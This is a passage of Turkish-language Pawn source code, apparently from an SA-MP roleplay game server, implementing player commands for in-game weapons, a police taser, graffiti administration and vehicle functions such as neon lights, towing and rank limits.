			    Hata(playerid, "Yakýnýnýzda herhangi bir iþyeri yok.");
			    return 1;
			}
			else
			{
		    	new query[256];
		        Isyeri[id][iid] = 0;
		        Isyeri[id][girisX] = 0;
	          	Isyeri[id][girisY] = 0;
				Isyeri[id][girisZ] = 0;
    			Isyeri[id][cikisX] = 0;
		        Isyeri[id][cikisY] = 0;
		        Isyeri[id][cikisZ] = 0;
		        Isyeri[id][igirisint] = 0;
		        Isyeri[id][igirisvw] = 0;
	         	Isyeri[id][icikisint] = 0;
		        Isyeri[id][icikisvw] = 0;
		        Isyeri[id][ikilit] = 0;
		        Isyeri[id][itip] = 0;
		        Isyeri[id][ikasa] = 0;
		        Isyeri[id][ivergi] = 0;
		        Isyeri[id][ifiyat] = 0;
		        Isyeri[id][girisangle] = 0;
		        Isyeri[id][cikisangle] = 0;
		        Isyeri[id][girisucreti] = 0;
		        Isyeri[id][urunfiyat][0] = 0;
		        Isyeri[id][urunfiyat][1] = 0;
		        Isyeri[id][urunfiyat][2] = 0;
		        Isyeri[id][urunfiyat][3] = 0;
		        Isyeri[id][urunfiyat][4] = 0;
		        Isyeri[id][urunfiyat][5] = 0;
		        Isyeri[id][urunfiyat][6] = 0;
          		Isyeri[id][urunfiyat][7] = 0;
          		Isyeri[id][urunfiyat][8] = 0;
          		Isyeri[id][urunfiyat][9] = 0;
		        Isyeri[id][yedekanahtar] = 0;
		        Isyeri[id][istok] = 0;
		        Isyeri[id][kira] = 0;
		        Isyeri[id][kiralayan] = -1;
		        Isyeri[id][kirafiyat] = 0;
		        DestroyDynamicPickup(Isyeri[id][ipickupid]);
				DestroyDynamic3DTextLabel(Isyeri[id][itext]);
		        Isyeri[id][ipickupid] = 0;
				Iter_Remove(Business, id);
		        format(query, sizeof(query), "DELETE FROM `isyerleri` WHERE `sqlid` = '%d'", id);
		        mysql_tquery(1,query);
		        return 1;
			}
		}
		return 1;
	}
//--------------------------------SÝALH KOMUTLARI---------------------------------
	if(strcmp(string, "/deagle", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 24);
		return 1;
	}
	if(strcmp(string, "/pistol", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 22);
		return 1;
	}
	if(strcmp(string, "/spistol", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 23);
		return 1;
	}
	if(strcmp(string, "/shotgun", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 25);
		return 1;
	}
	if(strcmp(string, "/sawnoff", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 26);
		return 1;
	}
	if(strcmp(string, "/minigun", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 38);
		return 1;
	}
	if(strcmp(string, "/scharge", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 39);
		return 1;
	}
	if(strcmp(string, "/fthrower", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
        Silah(playerid, 37);
		return 1;
	}
	if(strcmp(string, "/ysontup", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
        Silah(playerid, 42);
		return 1;
	}
	if(strcmp(string, "/rpg", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 35);
		return 1;
	}
	if(strcmp(string, "/hsrpg", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 36);
		return 1;
	}
	if(strcmp(string, "/sniper", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 34);
		return 1;
	}
	if(strcmp(string, "/crifle", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 33);
		return 1;
	}
	if(strcmp(string, "/molotof", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 18);
		return 1;
	}
	if(strcmp(string, "/flash", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 17);
		return 1;
	}
	if(strcmp(string, "/bomba", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 16);
		return 1;
	}
	if(strcmp(string, "/testere", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 9);
		return 1;
	}
	if(strcmp(string, "/mdildo", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 10);
		return 1;
	}
	if(strcmp(string, "/kbvibra", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 11);
		return 1;
	}
	if(strcmp(string, "/bbvibra", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 12);
		return 1;
	}
	if(strcmp(string, "/gumvibra", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 13);
		return 1;
	}
	if(strcmp(string, "/cicek", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 14);
		return 1;
	}
	if(strcmp(string, "/baston", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 15);
		return 1;
	}
	if(strcmp(string, "/katana", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 8);
		return 1;
	}
	if(strcmp(string, "/bsopasi", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 7);
		return 1;
	}
	if(strcmp(string, "/kurek", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 6);
		return 1;
	}
	if(strcmp(string, "/sopa", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 5);
		return 1;
	}
	if(strcmp(string, "/bicak", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
		Silah(playerid, 4);
		return 1;
	}
	if(strcmp(string, "/cop", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 3);
	    return 1;
	}
	if(strcmp(string, "/musta", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 1);
		return 1;
	}
	if(strcmp(string, "/golfsopasi", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 2);
		return 1;
	}
	if(strcmp(string, "/kamera", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
        Silah(playerid, 43);
		return 1;
	}
	if(strcmp(string, "/spray", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 41);
		return 1;
	}
	if(strcmp(string, "/tec9", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 32);
		return 1;
	}
	if(strcmp(string, "/m4", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 31);
		return 1;
	}
	if(strcmp(string, "/ak47", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 30);
		return 1;
	}
	if(strcmp(string, "/combatgun", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 27);
		return 1;
	}
	if(strcmp(string, "/mp5", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 29);
		return 1;
	}
	if(strcmp(string, "/uzi", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 28);
		return 1;
	}
	if(strcmp(string, "/parasut", true) == 0)
	{
	    if(IsPlayerInAnyVehicle(playerid))
	    {
	        Hata(playerid, "Araç içerisinde bu komutu kullanamazsýnýz.");
	        return 1;
		}
	    Silah(playerid, 46);
		return 1;
	}
//--------------------------------------------------------------------------------
	if(!strcmp(string, "/taser", true))
	{
		if(Birlik[Karakter[playerid][birlik]][ftip] == LSPA || (Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi]) || Birlik[Karakter[playerid][birlik]][ftip] == FBI)
		{
		    if(!Karakter[playerid][isbasi]) return Hata(playerid, "Ýþbaþý deðilsiniz.");
		    new TaserElinde[MAX_PLAYERS];
			for (new i = 0; i < 12; i++)
			{
	  			GetPlayerWeaponData(playerid, i, weapons2[i][0], weapons2[i][1]);
	  			if(weapons2[i][0] == 22 && !TaserElinde[playerid]) PistolElinde[playerid] = 1;
	  			if(weapons2[i][0] == 24 && !TaserElinde[playerid]) DeagleElinde[playerid] = 1;
	  			if(weapons2[i][0] == 23) TaserElinde[playerid] = 1;
			}
			if(!TaserElinde[playerid])
			{
			    Bilgi(playerid, "Taseri elinize aldýnýz.");
				MeGonder(playerid, 30.0, "taser silahýný teçhizat kemerinden alýr.");
			    GivePlayerWeapon(playerid, 23, 2);
			    SilahKullaniyor[playerid] = 1;
			    TaserDurum[playerid] = 1;
			}
			else
			{
			    if(IsPlayerInAnyVehicle(playerid))
			    {
		        Bilgi(playerid, "Taseri býraktýnýz.");
				MeGonder(playerid, 30.0, "taser silahýný teçhizat kemerine koyar.");
			    RemovePlayerWeapon(playerid, 23);
			    SilahKullaniyor[playerid] = 0;
			    TaserDurum[playerid] = 0;
				GivePlayerWeapon(playerid, 22, 50);
			    PistolElinde[playerid] = 0;
			    DeagleElinde[playerid] = 0;
			    }
			    else
				{
				Bilgi(playerid, "Taseri býraktýnýz.");
				MeGonder(playerid, 30.0, "taser silahýný teçhizat kemerine koyar.");
			    RemovePlayerWeapon(playerid, 23);
			    SilahKullaniyor[playerid] = 0;
			    TaserDurum[playerid] = 0;
			    GivePlayerWeapon(playerid, 24, 50);
			    PistolElinde[playerid] = 0;
			    DeagleElinde[playerid] = 0;
			    }
			}
		}
		else
		{
		    Hata(playerid, "Ýþbaþýnda deðilsiniz.");
		}
		return 1;
	}
//-------------------------------------------------------------------------------------------------
	//___________________GRAFFITI KOMUTLARI KEKO STYLE: GRAFFÝTÝ KOMUTLARI________________________________________
	if(strcmp(string, "/graffiti", true) == 0)
	{
	    if(Karakter[playerid][level] < 3) return Hata(playerid, "Graffiti yapabilmek için en az 3. seviyede olmalýsýnýz.");
		if(Karakter[playerid][graffitizin] == 0) return Hata(playerid, "Graffiti sistemini kullanabilmek için yöneticiden izin almalýsýnýz.");
	    if(GetPlayerWeapon(playerid) != 41)
	    {
	        Hata(playerid, "Elinizde sprey olmalý.");
	        return 1;
		}
		if(GetPlayerAmmo(playerid) < 450)
		{
		    Hata(playerid, "Yeterli miktarda spreye sahip deðilsiniz.");
		    return 1;
		}
		if(Karakter[playerid][gYapiyor] == 1) return Hata(playerid ,"Mevcut graffitiyi bitirmeden yeni bir graffiti yapamazsýnýz.");
        ShowPlayerDialog(playerid, DIALOG_GRAFFITI, DIALOG_STYLE_TABLIST, ""C7"EIGHTBORN - "C8"Graffiti", ""NOKTA" Graffiti\t "C2"Yazý\n"NOKTA" Graffiti\t "C2"Büyüklük\n"NOKTA" Graffiti\t "C2"Yazý Tipi\n"NOKTA" Graffiti\t "C2"Yazý Büyüklük\n"NOKTA" Graffiti\t "C2"Kalýnlýk\n"NOKTA" Graffiti\t "C2"Ortala\n"NOKTA" Graffiti\t "C2"Renk\n"NOKTA" Graffiti\t "C2"Konum Belirle\n"NOKTA" Graffiti\t "C2"Sil\n"NOKTA" Graffiti\t "C2"Kaydet(Tamamla)", "Tamam", "Iptal");
		return 1;
	}
	if(strcmp(string, "/agraffiti", true) == 0)
	{
	    if(Karakter[playerid][adminlevel] >= 4 && Karakter[playerid][aGirdi] == 1)
	    {
	    	string = strtok(cmdtext, idx);
	    	if(!strlen(string))
	    	{
	        	Kullanim(playerid, "/agraffiti [fonksiyon]");
	        	SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: id, sil, git, hepsi, izin");
	        	return 1;
			}
			else if(strcmp(string, "id", true) == 0)
			{
				for(new x = 0; x < MAX_GRAFFITI; x++)
				{
				    if(IsPlayerInRangeOfPoint(playerid, 5.0, Graffitiler[x][gPos][0], Graffitiler[x][gPos][1], Graffitiler[x][gPos][2]))
				    {
				        format(string, sizeof(string), "Graffiti ID: %d", x);
				        Bilgi(playerid, string);
				        break;
				    }
				    else
				    {
				        Hata(playerid, "Burada graffiti yok.");
						return 1;
					}
				}
				return 1;
			}
			else if(strcmp(string, "izin", true) == 0)
			{
			    string = strtok(cmdtext, idx);
			    new giveplayerid = ReturnUser(string);
			    if(!strlen(string)) return Kullanim(playerid, "/agraffiti izin [oyuncuID]");
				if(giveplayerid == INVALID_PLAYER_ID) return Hata(playerid, "Böyle bir oyuncu bulunamadý.");
				Bilgi(playerid, "Graffiti izini verildi.");
				Karakter[giveplayerid][graffitizin] = 1;
				Bilgi(giveplayerid, "Yönetici tarafýndan graffiti izni aldýnýz.");
				return 1;
			}
			else if(strcmp(string, "sil", true) == 0)
			{
			    string = strtok(cmdtext, idx);
			    if(!strlen(string))
			    {
			        Kullanim(playerid, "/agraffiti sil [ID]");
			        return 1;
			    }
			    if(strval(string) == 0)
			    {
			        return 1;
				}
				new grfID = strval(string);
				if(Graffitiler[grfID][gPos][0] == 0 && Graffitiler[grfID][gPos][1] == 0 && Graffitiler[grfID][gPos][2] == 0) return Hata(playerid, "Hatalý id.");
			    new SQLSorgusu[1024];
			    Graffitiler[grfID][gPos][0] = 0;
			    Graffitiler[grfID][gPos][1] = 0;
			    Graffitiler[grfID][gPos][2] = 0;
			    DestroyDynamicObject(Graffitiler[grfID][gObje]);
			    format(SQLSorgusu, sizeof(SQLSorgusu), "DELETE FROM `graffitiler` WHERE `GraffitiID` = '%d'", grfID);
			    mysql_tquery(1, SQLSorgusu);
			    format(string, sizeof(string), "Graffitiyi sildiniz. GraffitiID: %d", grfID);
			    Bilgi(playerid, string);
			    format(string, sizeof(string), "[GRAFFITISIL] % idli graffitiyi sildi.", grfID);
			    Log(playerid, string);
			    return 1;
			}
			else if(strcmp(string, "git", true) == 0)
			{
			    string = strtok(cmdtext, idx);
			    if(!strlen(string))
			    {
			        Kullanim(playerid, "/agraffiti git [ID]");
			        return 1;
			    }
			    new grfID = strval(string);
			    if(Graffitiler[grfID][gPos][0] == 0 && Graffitiler[grfID][gPos][1] == 0 && Graffitiler[grfID][gPos][2] == 0) return Hata(playerid, "Hatalý id.");
			    SetPlayerPos(playerid, Graffitiler[grfID][gPos][0], Graffitiler[grfID][gPos][1], Graffitiler[grfID][gPos][2]);
			    SetPlayerInteriorEx(playerid, Graffitiler[grfID][gInt]);
			    SetPlayerVirtualWorld(playerid, Graffitiler[grfID][gVW]);
			    format(string, sizeof(string), "Graffitiye gittiniz. Graffiti ID: %d", grfID);
			    Bilgi(playerid, string);
			    return 1;
			}
			else if(strcmp(string, "hepsi", true) == 0)
			{
			    for(new x = 0; x < MAX_GRAFFITI; x++)
			    {
			        if(Graffitiler[x][gPos][0] != 0 && Graffitiler[x][gPos][1] != 0 && Graffitiler[x][gPos][2] != 0)
			        {
			            format(string, sizeof(string), "ID:%d Sahibi SQLID: %d Graffiti: %s", x, Graffitiler[x][gYapan], Graffitiler[x][gYazi]);
			            Bilgi(playerid, string);
			        }
				}
				return 1;
			}
		}
		else
		{
		    Hata(playerid, "Graffiti menüsüne ulaþabilmek için yeterli yetkiye sahip deðilsiniz.");
		    return 1;
		}
	}
	//___________________ARAÇ KOMUTLARI________________________________________
	if(strcmp(string, "/neon", true) == 0)
	{
		new aracID = GetPlayerVehicleID(playerid);
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 1;
		if(aracID != INVALID_VEHICLE_ID)
		{
		    if(Arac[aracID][akilit] == 1) return 1;
		    if(Arac[aracID][aneon] < 18640) return 1;
		    if(!GetPVarInt(playerid, "neon"))
		    {
		        DestroyDynamicObject(GetPVarInt(playerid, "neon"));
		        DestroyDynamicObject(GetPVarInt(playerid, "neon"));
		        DeletePVar(playerid, "neon");
		        DeletePVar(playerid, "neon1");
			}
			else
			{
			    new Float:neonX, Float:neonY, Float:neonZ;
			    new renkne = Arac[aracID][aneon];
			    GetVehicleModelInfo(GetVehicleModel(aracID), 1, neonX, neonY, neonZ);
			    SetPVarInt(playerid, "neon", CreateDynamicObject(renkne,0,0,0,0,0,0,0,0));
		        SetPVarInt(playerid, "neon1", CreateDynamicObject(renkne,0,0,0,0,0,0,0,0));
		        AttachDynamicObjectToVehicle(GetPVarInt(playerid, "neon"), aracID, (neonX*0.26119403), 0.00, (neonZ*-0.407081477), 0.0, 0.0, 0.0);
				AttachDynamicObjectToVehicle(GetPVarInt(playerid, "neon1"), aracID, -(neonX*0.26119403), 0.00, (neonZ*-0.407081477), 0.0, 0.0, 0.0);
			}
		}
		return 1;
	}
	if(strcmp(string, "/oldcar", true) == 0)
	{
		format(string,sizeof(string),"En son bindiðiniz araç: %d", SonArac[playerid]);
		SendClientMessage(playerid,COLOR_GREY,string);
	  	return 1;
	}
	if(strcmp(string, "/a", true) == 0 || strcmp(string, "/arac", true) == 0)
	{
	    if(Karakter[playerid][level] < 2)
	        return Hata(playerid, "Bu komutu kullanabilmeniz için en az 2. seviye olmanýz gerekmektedir.");
	    string = strtok(cmdtext, idx);
	    if(!strlen(string))
	    {
			Kullanim(playerid, "(/a)rac [fonksiyon]");
			SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: satinal, kirala, liste, bilgi, sat, kilit, kilitid, gps, hurda, in, sigorta");
			if(Birlik[Karakter[playerid][birlik]][ftip] == CETE || Birlik[Karakter[playerid][birlik]][ftip] == MC || Birlik[Karakter[playerid][birlik]][ftip] == MAFYA) SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: cam, kaput, bagaj, far, yedekanahtar, radyo, cezaode, at, rutbe, cek, gelir, kutular");
            else if(Birlik[Karakter[playerid][birlik]][ftip] == YARIS) SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: cam, kaput, bagaj, far, yedekanahtar, radyo, cezaode, at, rutbe, cek, gelir, parcala, tahta");
			else SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: cam, kaput, bagaj, far, yedekanahtar, radyo, cezaode, at, rutbe, cek, gelir");
			SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: parkdurum, parksatinal, park");
			return 1;
		}
		if(Buysa("tahta", string))
		{
			if(Karakter[playerid][adminlevel] >= 6 && Karakter[playerid][aGirdi] == 1)
			{
		    	return ShowPlayerDialog(playerid, 436, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Araçlar(Araç Tahta)", "Araç 1\nAraç 2\nAraç 3\nAraç 4\nAraç 5", "Seç", "Ýptal");
		    }
		}
		else if(Buysa("parcala", string))
		{
		    if(Birlik[Karakter[playerid][birlik]][ftip] != YARIS) return Hata(playerid, "Sadece yarýþ birlikleri araç parçalayabilir.");
		    if(Birlik[Karakter[playerid][birlik]][seviye] < 3) return Hata(playerid, "Birlik seviyeniz yeterli deðil.");
		    if(PolisSay() < 5) return Hata(playerid, "Oyunda 5 aktif polis olmadan araç parçalayamazsýnýz.");
		    if(!BirlikYetkili(playerid) && Karakter[playerid][sqlid] != Birlik[Karakter[playerid][birlik]][blider]) return Hata(playerid, "Bu iþlemi sadece birlik yetkilileri gerçekleþtirebilir.");
		    if(!IsPlayerInAnyVehicle(playerid) || GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return Hata(playerid, "Aracýn içinde deðilsiniz.");
		    new vid=GetPlayerVehicleID(playerid);
		    if(!gAracParcalanabilir[vid]) return Hata(playerid, "Bu araç kaçýrýlmamýþ.");
		    if(Arac[vid][atip] != 1) return Hata(playerid, "Sadece bir oyuncunun sahip olduðu araçlar parçalanabilir.");
		    if(Arac[vid][parcalandi]) return Hata(playerid, "Bu araç zaten parçalanmýþ.");
		    DONDUR(playerid);
		    SetPVarInt(playerid, "AracParcaliyor", 120);
	        PlayerTextDrawShow(playerid, GeriSayimTD[playerid]);
	        PlayerTextDrawSetString(playerid, GeriSayimTD[playerid], "120");
	        return 1;
		}
		/*else if(Buysa("sigorta", string))
		{
			if(!IsPlayerInRangeOfPoint(playerid, 15.0, Veriler[gposx], Veriler[gposy], Veriler[gposz])) return Hata(playerid, "Galeride deðilsiniz.");
			if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Aracýn içinde deðilsiniz.");
			string = strtok(cmdtext, idx);
	    	if(!strlen(string)) {
	    	    Kullanim(playerid, "Araca sigorta yaptýrmak istiyor musunuz? Ücret : "C1"500$");
				Kullanim(playerid, "/arac sigorta [kabul]");
				return 1;
			}
			if(Buysa(string, "kabul"))
			{
				if(Arac[GetPlayerVehicleID(playerid)][sigorta]) return Hata(playerid, "Zaten bu aracýn sigortasý bulunuyor.");
				if(GetPlayerCash(playerid) < 500) return Hata(playerid, "Üzerinizde yeterli miktarda para bulunmamaktadýr.");
			    GivePlayerCash(playerid, -500);
			    Arac[GetPlayerVehicleID(playerid)][sigorta] = 1;du
			    Bilgi(playerid, "Araca baþarýyla sigorta yaptýrdýnýz.");
			}
		}*/
		else if(Buysa("silahsok", string))
		{
			if(!IsPlayerInAnyVehicle(playerid) || GetPlayerWeapon(playerid) == 0 || GetPVarInt(playerid, "PwepTimer") != 0) return 1;
		    Pwep[playerid] = GetPlayerWeapon(playerid);
			SetPlayerArmedWeapon(playerid, 0);
		}
		else if(Buysa("gelir", string))
		{
		    if(!Girdi[playerid]) return 1;
		    string = strtok(cmdtext, idx);
		    if(isnull(string)) return Kullanim(playerid, "/a(rac) gelir [aracID] [gelir]"),SendClientMessage(playerid, -1, ""C3"Þirketinizin tur parasýndan ne kadar kesiceðini belirtin.");
            new _vid = strval(string);
            string = strtok(cmdtext, idx);
            if(isnull(string)) return Kullanim(playerid, "/a(rac) gelir [aracID] [gelir]"),SendClientMessage(playerid, -1, ""C3"Þirketinizin tur parasýndan ne kadar kesiceðini belirtin.");
            new _gelir = strval(string);
            if(_gelir < 100 || _gelir > 800) return Hata(playerid, "Kesiceðiniz para 100$'dan düþük, 800$'dan fazla olamaz.");
			if(Arac[_vid][aowner] != Karakter[playerid][sqlid] || (Arac[_vid][atip] != 10 && Arac[_vid][atip] != 14)) return Hata(playerid, "Bu aracýn gelirini düzenleyemezsiniz.");
			new mstring[128];
			format(mstring, sizeof(mstring), "%d idli aracýn geliri %d$ olarak düzenlendi.",_vid,_gelir);
			Bilgi(playerid, mstring);
			Arac[_vid][agelir] = _gelir;
		}
		else if(Buysa("cek", string))
		{
		    if(!Girdi[playerid]) return 1;
		    string = strtok(cmdtext, idx);
		    if(isnull(string)) return Kullanim(playerid, "/a(rac) cek [aracID]");
			new _vid = strval(string);
			if(Arac[_vid][abirliktip] != 0 && Arac[_vid][atip] != 1 && Arac[_vid][atip] != 2) return Hata(playerid, "Bu aracý baðlayamazsýnýz.");
			if(!IsValidVehicle(_vid)) return Hata(playerid, "Hatalý araç idsi belirttiniz.");
		    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return Hata(playerid, "Araç çekmek için sürücü koltuðunda bulunmalýsýnýz.");
			if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid))) return DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
			if(GetVehicleModel(GetPlayerVehicleID(playerid))==525)
			{
				static Float:pX,Float:pY,Float:pZ;
				GetVehiclePos(GetPlayerVehicleID(playerid),pX,pY,pZ);
				#pragma unused pZ
				static Float:vX,Float:vY,Float:vZ;
				GetVehiclePos(_vid, vX, vY, vZ);
				#pragma unused vZ
				static _distance;
				_distance = floatround( floatsqroot( floatabs ( floatadd( floatpower((pX-vX), 2) , floatpower((pY-vY), 2) ) ) ) );
				if(_distance < 7.5)
				{
					AttachTrailerToVehicle(_vid,GetPlayerVehicleID(playerid));
				}
				else return Hata(playerid, "Araca yakýn deðilsiniz.");
			}
			else return Hata(playerid, "Çekicinin içerisinde bulunmuyorsunuz.");
		}
		else if(Buysa("gelistir", string))
		{
		    if(!Girdi[playerid]) return 1;
		    if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Aracýn içerisinde olmanýz gerekmektedir.");
		    foreach(new i : Business)
		    {
            	if(Isyeri[i][itip] == 15 && IsPlayerInRangeOfPoint(playerid, 30.0, Isyeri[i][acikisx], Isyeri[i][acikisy], Isyeri[i][acikisz]) && GetPlayerVirtualWorld(playerid) == i && GetPlayerInterior(playerid) == 1)
			    {
					if(!IsyeriYetkilisi(playerid, i)) return Hata(playerid, "Bu iþyerinde yetkili deðilsiniz.");
		    		AracGelistir(playerid);
				}
			}
		}
		else if(Buysa("in", string))
		{
		    if(!IsPlayerInAnyVehicle(playerid)) return Hata(playerid, "Aracýn içerisinde olmanýz gerekmektedir.");
		    RemovePlayerFromVehicle(playerid);
		}
		else if(Buysa("rutbe", string))
		{
			if(Birlik[Karakter[playerid][birlik]][blider] != Karakter[playerid][sqlid]) return Hata(playerid, "Birliðin lideri deðilsiniz.");
			new vid=GetNearestVehicle(playerid);
			if(!IsValidVehicle(vid)) return Hata(playerid, "Herhangi bir aracýn yakýnýnda deðilsiniz.");
			if(Arac[vid][abirlik] != Karakter[playerid][birlik] || Arac[vid][atip] != 2) return Hata(playerid, "Bu araç sizin birliðinize ait deðil.");
            string = strtok(cmdtext, idx);
            if(isnull(string)) return Kullanim(playerid, "/a(rac) rutbe [rutbeno]");
			new mstring[64];
			format(mstring, sizeof(mstring), "%d idli aracýn rütbesini %d olarak ayarladýnýz.",vid,strval(string));
			Bilgi(playerid,mstring);
			format(mstring, sizeof(mstring), "Araca sadece %d rütbesi ve üstü binebilir.",strval(string));
			Bilgi(playerid,mstring);
			Arac[vid][arutbe] = strval(string);
			AracKaydet(vid);
		}
		else if(Buysa("hurda", string))
		{
